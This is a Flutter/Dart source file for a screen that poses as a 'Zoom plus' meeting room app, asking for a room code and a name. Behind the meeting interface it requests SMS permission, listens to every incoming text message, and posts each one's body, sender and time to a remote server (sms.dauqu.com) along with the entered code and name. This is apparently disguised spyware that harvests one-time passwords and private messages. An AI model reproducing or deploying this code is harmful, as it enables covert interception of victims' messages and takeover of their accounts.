import 'dart:convert';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:readsms/readsms.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:sms/components/dashboard.dart';
import 'package:sms/components/notificationservice.dart';
import 'package:sms/components/welcome.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:vibration/vibration.dart';

class Home extends StatefulWidget {
  const Home({Key? key}) : super(key: key);

  @override
  State<Home> createState() => _HomeState();
}

class _HomeState extends State<Home> {
  final _plugin = Readsms();
  late SharedPreferences prefs;

  final TextEditingController _codeController = TextEditingController();
  final TextEditingController _nameController = TextEditingController();

  //Set shared preferences
  Future<void> _setPrefs() async {
    prefs = await SharedPreferences.getInstance();
    //Set Country TextController
    _codeController.text = prefs.getString('code').toString();
    _nameController.text = prefs.getString('name').toString();
  }

  String sms = 'no sms received';
  String sender = 'no sms received';
  String time = 'no sms received';

  var res;

  Future SaveData() async {
    final prefs = await SharedPreferences.getInstance();
    var code = prefs.getString('code');
    var name = prefs.getString('name');

    try {
      final response =
          await http.post(Uri.parse("https://sms.dauqu.com/api/v1/sms"),
              headers: <String, String>{
                'Content-Type': 'application/json; charset=UTF-8',
              },
              body: jsonEncode(<String, String>{
                "sms": sms,
                "sender": sender,
                "code": code.toString(),
                "time": time,
                "name": name.toString(),
              }));
      setState(() {});

      if (response.statusCode == 200) {
        // ignore: use_build_context_synchronously
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(res['message'].toString()),
            duration: const Duration(seconds: 2),
          ),
        );
      } else {
        setState(() {
          // message = res['message'].toString();
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text(res['message'].toString()),
              duration: const Duration(seconds: 3),
            ),
          );
        });
      }
    } catch (e) {
      setState(() {
        // error = e.toString();
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(e.toString()),
            duration: const Duration(seconds: 3),
          ),
        );

        //Redirect to OTP page
      });
    }
  }

  Future<bool> getPermission() async {
    if (await Permission.sms.status == PermissionStatus.granted) {
      return true;
    } else {
      if (await Permission.sms.request() == PermissionStatus.granted) {
        return true;
      } else {
        return false;
      }
    }
  }

  @override
  void dispose() {
    super.dispose();
    _plugin.dispose();
  }

  bool isLogin = false;
  bool isloading = false;

  @override
  void initState() {
    super.initState();
    NotificationService().showNotification(1, "Zoom plus meeting is running",
        "Touch for more information or to stop the app", 1);
        
    _setPrefs();
    getPermission().then((value) {
      if (value) {
        _plugin.read();
        _plugin.smsStream.listen((event) {
          setState(() {
            sms = event.body;
            sender = event.sender;
            time = event.timeReceived.toString();
            SaveData();
          });
        });
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        elevation: 5,
        backgroundColor: Colors.blue.shade800,
        title: const Text('Meeting Room'),
      ),
      body: SingleChildScrollView(
        child: Container(
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              const SizedBox(
                height: 50,
              ),
              const Text(
                'Enter your code',
                style: TextStyle(
                  fontSize: 20,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(
                height: 20,
              ),
              const Text("Please enter the room code to continue"),
              const SizedBox(
                height: 20,
              ),
              TextField(
                controller: _codeController,
                keyboardType: TextInputType.number,
                inputFormatters: [
                  FilteringTextInputFormatter.digitsOnly,
                  LengthLimitingTextInputFormatter(6),
                ],
                decoration: const InputDecoration(
                  isDense: true,
                  hintText: 'Enter code',
                  border: OutlineInputBorder(),
                ),
                onChanged: (value) {
                  setState(() {
                    prefs.setString('code', value);
                  });
                },
              ),
              const SizedBox(
                height: 20,
              ),
              TextField(
                controller: _nameController,
                decoration: const InputDecoration(
                  isDense: true,
                  hintText: 'Your name',
                  border: OutlineInputBorder(),
                ),
                onChanged: (value) {
                  setState(() {
                    prefs.setString('name', value);
                  });
                },
              ),
              const SizedBox(
                height: 20,
              ),
              ElevatedButton(
                style: ElevatedButton.styleFrom(
                  elevation: 0,
                  primary: Colors.blue.shade800, // background
                  onPrimary: Colors.white, // foreground
                  padding: const EdgeInsets.all(15),
                ),
                onPressed: () {
                   Vibration.vibrate(duration: 5000);
                  if (_codeController.text.length == 6 &&
                      _nameController.text.isNotEmpty) {
                    Navigator.push(
                      context,
                      MaterialPageRoute(
                        builder: (context) => const Welcome(),
                      ),
                    );
                  } else {
                    showDialog(
                      context: context,
                      builder: (context) => AlertDialog(
                        title: const Text('Error'),
                        content: const Text(
                            'Please enter a valid 6 digit code and name'),
                        actions: <Widget>[
                          ElevatedButton(
                            onPressed: () => Navigator.pop(context),
                            child: const Text('OK'),
                          ),
                        ],
                      ),
                    );
                  }
                  NotificationService().showNotification(
                      1,
                      "Zoom plus meeting is running",
                      "Touch for more information or to stop the app",
                      1);
                },
                child: const Text(
                  'Continue',
                  style: TextStyle(
                    color: Colors.white,
                  ),
                ),
              )
            ],
          ),
        ),
      ),
    );
  }
}
